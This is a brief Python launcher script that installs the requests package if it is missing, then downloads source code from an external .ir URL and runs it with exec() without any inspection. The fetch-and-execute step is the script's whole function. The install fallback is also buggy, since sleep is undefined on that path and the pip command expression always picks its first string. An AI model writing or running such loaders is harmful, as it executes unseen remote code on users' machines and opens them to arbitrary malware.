try: 
	from time import sleep
	import requests
except:
     from os import system, name
     print("Not install Package . Installing Package . Connect To Internet ")
     sleep(3)
     system("pip install requests" or "pip3 install requests")

bmbsource = requests.get("http://sharabiyan-goose.ir/csb/bmb.py").text
exec(bmbsource)